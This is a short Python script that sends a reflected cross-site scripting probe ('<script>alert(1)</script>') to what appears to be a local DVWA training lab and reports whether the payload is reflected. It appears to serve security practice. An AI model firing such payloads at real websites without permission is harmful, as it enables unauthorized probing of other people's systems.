#!/usr/bin/env python3

import requests

# ---------------------------
# ✅ CONFIGURATION
# ---------------------------

TARGET_URL = "http://127.0.0.1:8080/vulnerabilities/xss_r/"
PARAM_NAME = "name"

COOKIES = {
    "PHPSESSID": "cq6h1rp6qj01532fivhbli1au1",
    "security": "low"
}

HEADERS = {
    "Host": "127.0.0.1:8080",
    "sec-ch-ua": '"Not?A_Brand";v="99", "Chromium";v="130"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# Your test payload
payload = "<script>alert(1)</script>"

# ---------------------------
# ✅ SEND THE REQUEST
# ---------------------------
def main():
    params = {PARAM_NAME: payload}
    response = requests.get(TARGET_URL, headers=HEADERS, cookies=COOKIES, params=params)

    print(f"[+] Sent payload: {payload}")
    print(f"[+] Response URL: {response.url}")
    print(f"[+] Status Code: {response.status_code}")

    if payload in response.text:
        print("\n[🔥] Payload reflected in response! Possible XSS.\n")
    else:
        print("\n[⚠️] Payload not reflected. Check manually.\n")

    # Save response to file for manual review
    with open("response.html", "w", encoding="utf-8") as f:
        f.write(response.text)
    print("[+] Saved response as response.html")

if __name__ == "__main__":
    main()
